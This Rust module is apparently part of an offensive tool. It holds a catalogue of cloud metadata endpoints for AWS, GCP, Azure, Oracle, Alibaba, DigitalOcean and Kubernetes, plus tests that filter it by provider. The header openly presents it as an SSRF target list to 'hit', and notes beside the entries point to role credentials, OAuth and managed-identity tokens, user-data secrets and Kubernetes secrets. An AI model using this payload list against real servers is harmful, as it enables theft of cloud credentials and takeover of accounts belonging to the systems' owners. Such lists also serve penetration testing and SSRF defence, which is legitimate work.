//! Cloud instance-metadata endpoint catalogue — the SSRF target list. Static; a
//! reference for "if you have an SSRF/proxy, hit these".

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Endpoint {
    pub provider: String,
    pub url: String,
    pub note: String,
}

/// The full catalogue.
fn catalog() -> Vec<Endpoint> {
    let e = |provider: &str, url: &str, note: &str| Endpoint {
        provider: provider.to_string(),
        url: url.to_string(),
        note: note.to_string(),
    };
    vec![
        e("aws", "http://169.254.169.254/latest/meta-data/", "IMDSv1 tree (iam/security-credentials for role keys)"),
        e("aws", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "role name → temporary AWS credentials"),
        e("aws", "http://169.254.169.254/latest/user-data/", "EC2 user-data (often holds secrets)"),
        e("aws", "http://169.254.169.254/latest/api/token", "IMDSv2 token (PUT, X-aws-ec2-metadata-token-ttl-seconds)"),
        e("gcp", "http://metadata.google.internal/computeMetadata/v1/?recursive=true", "requires header Metadata-Flavor: Google"),
        e("gcp", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "service-account OAuth token"),
        e("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "requires header Metadata: true"),
        e("azure", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "managed-identity token"),
        e("oracle", "http://169.254.169.254/opc/v2/instance/", "requires header Authorization: Bearer Oracle"),
        e("alibaba", "http://100.100.100.200/latest/meta-data/", "Alibaba Cloud ECS metadata"),
        e("digitalocean", "http://169.254.169.254/metadata/v1.json", "DigitalOcean droplet metadata"),
        e("kubernetes", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", "API server (needs the pod service-account token)"),
    ]
}

/// Endpoints for `provider` (case-insensitive); empty / `all` returns everything.
pub fn endpoints(provider: &str) -> Vec<Endpoint> {
    let p = provider.trim().to_ascii_lowercase();
    if p.is_empty() || p == "all" {
        return catalog();
    }
    catalog().into_iter().filter(|e| e.provider == p).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn filters_by_provider() {
        let aws = endpoints("AWS");
        assert!(!aws.is_empty());
        assert!(aws.iter().all(|e| e.provider == "aws"));
        assert!(aws.iter().any(|e| e.url.contains("iam/security-credentials")));
    }

    #[test]
    fn all_returns_every_provider() {
        let all = endpoints("all");
        for p in ["aws", "gcp", "azure", "oracle", "alibaba", "digitalocean", "kubernetes"] {
            assert!(all.iter().any(|e| e.provider == p), "missing {p}");
        }
        assert_eq!(endpoints("").len(), all.len());
    }

    #[test]
    fn unknown_provider_is_empty() {
        assert!(endpoints("nope").is_empty());
    }
}
